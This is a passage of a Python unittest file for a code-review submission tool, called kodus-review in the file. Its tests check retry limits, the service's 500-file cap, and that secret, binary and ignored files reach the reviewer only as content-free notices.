        self.assertEqual([(r['status'],r['attempt']) for r in e['kodus']['retries']],[(502,1),(502,2)])
        self.assertEqual(sum(1 for c in self.calls if c[2] is not None),1)
        # A persistent 502 ends NO_VERDICT at the deadline.
        self.get_failures=10**6
        run,e=self.run_review({'KODUS_REVIEW_TIMEOUT':'1'},patched=fast)
        self.assertEqual(run.returncode,2,run.stderr);self.assertIn('deadline',e['kodus']['error'])
        self.assertGreater(len(e['kodus']['retries']),2)
        # 401 on a poll is terminal: one GET, no retry.
        self.get_failures=1;self.get_failure_status=401;calls=len(self.calls)
        run,e=self.run_review(patched=fast)
        self.assertEqual(run.returncode,2,run.stderr);self.assertIn('HTTP 401',e['kodus']['error'])
        self.assertEqual(len([c for c in self.calls[calls:] if c[2] is None]),1)
        # A failed enqueue POST is never retried (no automatic paid resubmission).
        self.get_failures=0;self.http_status=502;calls=len(self.calls)
        run,e=self.run_review(patched=fast)
        self.assertEqual(run.returncode,2,run.stderr);self.assertIn('HTTP 502',e['kodus']['error'])
        self.assertEqual(len(self.calls)-calls,1)

    def test_kodus_is_told_withheld_paths_exist_but_never_their_content(self):
        self.write('db/migrations/119_x.sql','-- migration\n');self.write('.env','TOKEN=base\n')
        self.write('img.bin',b'\x00old');self.commit_all('base')
        self.write('db/migrations/119_x.sql','-- migration from digest abc\n')
        snapshot=self.write('db/migrations/snapshots/abc.sql.gz',b'\x1f\x8b\x00SNAPSHOT-CONTENT')
        self.write('.env','TOKEN=leaked-value\n');self.write('img.bin',b'\x00new-binary-content')
        (self.repo/'gone.lock').unlink() if (self.repo/'gone.lock').exists() else None
        self.ignores=self.write_ignores(['db/migrations/snapshots/**'])
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,e and e['kodus'].get('error'))
        body=self.calls[0][2];files=body['config']['files']
        self.assertEqual([f['path'] for f in files],
                         ['db/migrations/119_x.sql','.env','img.bin','db/migrations/snapshots/abc.sql.gz'])
        stubs={f['path']:f for f in files[1:]}
        self.assertEqual(stubs['db/migrations/snapshots/abc.sql.gz'],{'path':'db/migrations/snapshots/abc.sql.gz',
            'status':'added','content':'','diff':'@@ -0,0 +1 @@\n+[kodus-review: this changed file is part of the '
            'change but withheld from this review (ignored by the repository review scope); its content is not '
            'shown; %d bytes]\n' % snapshot.stat().st_size})
        # Secrets: name and class only, no size or blob.
        self.assertEqual(stubs['.env']['diff'],'@@ -0,0 +1 @@\n+[kodus-review: this changed file is part of the '
                         'change but withheld from this review (secret file); its content is not shown]\n')
        self.assertEqual(stubs['img.bin']['status'],'modified');self.assertIn('(binary)',stubs['img.bin']['diff'])
        text=json.dumps(body)
        for secret in ('leaked-value','SNAPSHOT-CONTENT','new-binary-content','TOKEN='):
            self.assertNotIn(secret,text)
        # The raw diff (git-applied in the service's sandbox) carries only the real sent diff.
        self.assertEqual(body['diff'],files[0]['diff'])
        self.assertEqual(body['diff'].encode(),Path(e['candidate']['submitted_patch_path']).read_bytes())
        self.assertEqual(json.loads(Path(e['candidate']['files_path']).read_text()),files)
        self.assertEqual(e['candidate']['notified_paths'],['.env','img.bin','db/migrations/snapshots/abc.sql.gz'])
        self.assertEqual({d['path']:d.get('notified') for d in e['candidate']['dispositions']},
                         {'.env':'individual','db/migrations/119_x.sql':None,
                          'db/migrations/snapshots/abc.sql.gz':'individual','img.bin':'individual'})
        self.assertEqual(e['kodus']['result']['filesAnalyzed'],4)
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)
        # Over the request bound: secret, then binary, then ignored get individual notices while
        # they fit; the last one also counts the rest.
        run,e=self.run_review(patched={'MAX_SENT_FILES':3})
        self.assertEqual(run.returncode,0,e and e['kodus'].get('error'))
        files=self.calls[-2][2]['config']['files']
        self.assertEqual([f['path'] for f in files],['db/migrations/119_x.sql','.env','img.bin'])
        self.assertTrue(files[-1]['diff'].endswith('+[kodus-review: 1 further changed paths are withheld from '
                                                    'this review and not listed individually: ignored 1, binary 0, secret 0]\n'))
        self.assertEqual({d['path']:d.get('notified') for d in e['candidate']['dispositions']},
                         {'.env':'individual','db/migrations/119_x.sql':None,
                          'db/migrations/snapshots/abc.sql.gz':'grouped','img.bin':'individual'})
        # SKIPPED makes no request, so nothing is notified.
        self.write('db/migrations/119_x.sql','-- migration\n');self.write('.env','TOKEN=base\n')
        self.write('img.bin',b'\x00old')
        self.ignores=self.write_ignores(['db/migrations/snapshots/**'])
        run,e=self.run_review()
        self.assertEqual(e['kodus']['verdict'],'SKIPPED')
        self.assertEqual([(d.get('notified'),d.get('notified_reason')) for d in e['candidate']['dispositions']],
                         [(False,'skipped')])

    def test_hundreds_of_ignored_paths_beside_real_edits_still_get_a_verdict(self):
        for i in range(10):
            self.write('src/m%02d.py' % i,'v = 0\n')
        self.commit_all('base')
        for i in range(10):
            self.write('src/m%02d.py' % i,'v = 1\n')
        for i in range(600):
            self.write('fixtures/rec%03d.json' % i,'{"n": %d}\n' % i)
        self.ignores=self.write_ignores(['fixtures/**'])
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,e and e['kodus'].get('error'))
        files=self.calls[0][2]['config']['files']
        self.assertEqual(len(files),500);self.assertEqual(len(self.sent_files()),10)
        self.assertEqual(e['kodus']['result']['filesAnalyzed'],500)
        self.assertEqual([f['path'] for f in files[10:]],['fixtures/rec%03d.json' % i for i in range(490)])
        self.assertTrue(files[-1]['diff'].endswith('+[kodus-review: 110 further changed paths are withheld from '
                                                    'this review and not listed individually: ignored 110, binary 0, secret 0]\n'))
        notified=[d['notified'] for d in e['candidate']['dispositions'] if d['disposition']=='ignored']
        self.assertEqual((notified.count('individual'),notified.count('grouped')),(490,110))
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)

    def test_more_than_500_sent_paths_still_refuse(self):
        for i in range(501):
            self.write('s/f%03d.py' % i,'v = %d\n' % i)
        run,e=self.run_review()
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('API limit of 500',e['kodus']['error'])
        self.assertEqual(self.calls,[])

    def test_notices_carry_no_blob_id_and_overlong_withheld_paths_are_grouped(self):
        # A 4-digit fixture: a blob id would let anyone recover the content by trying all 10,000.
        self.write('fixtures/pin.txt','4821');self.write('a.py','value = 130\n')
        longdir='/'.join(['d'*99]*5)
        longpath='fixtures/'+longdir+'/'+'f'*4+'.json'
        self.assertGreater(len(longpath),500)
        self.write(longpath,'{"long": true}\n')
        self.ignores=self.write_ignores(['fixtures/**'])
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,e and e['kodus'].get('error'))
        files=json.loads(Path(e['candidate']['files_path']).read_text())
        pin=self.git('rev-parse',e['candidate']['tree']+':fixtures/pin.txt').strip()
        self.assertNotIn(pin,json.dumps(files));self.assertNotIn('blob',json.dumps(files))
        self.assertEqual([f['path'] for f in files],['a.py','fixtures/pin.txt'])
        self.assertEqual(files[1]['diff'],'@@ -0,0 +1,2 @@\n+[kodus-review: this changed file is part of the change but '
                         'withheld from this review (ignored by the repository review scope); its content is not shown; '
                         '4 bytes]\n+[kodus-review: 1 further changed paths are withheld from this review and not listed '
                         'individually: ignored 1, binary 0, secret 0]\n')
        self.assertEqual({d['path']:d.get('notified') for d in e['candidate']['dispositions']},
                         {'a.py':None,'fixtures/pin.txt':'individual',longpath:'grouped'})
        code,report=self.run_verify(e['evidence_path'],renderer)
        self.assertEqual((code,report['verdict']),(0,'VERIFIED'),report)

    def test_exactly_500_sent_paths_leave_no_slot_for_notices(self):
        for i in range(500):
            self.write('s/f%03d.py' % i,'v = %d\n' % i)
        self.write('fixtures/rec.json','{}\n')
        self.ignores=self.write_ignores(['fixtures/**'])
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,e and e['kodus'].get('error'))
        self.assertEqual(len(self.calls[0][2]['config']['files']),500)
        withheld=[d for d in e['candidate']['dispositions'] if d['disposition']=='ignored']
        self.assertEqual([(d['path'],d['notified'],d['notified_reason']) for d in withheld],
                         [('fixtures/rec.json',False,'no-slot')])
        self.assertTrue(all('notified_reason' not in d for d in e['candidate']['dispositions'] if d['disposition']=='sent'))

if __name__=='__main__': unittest.main()
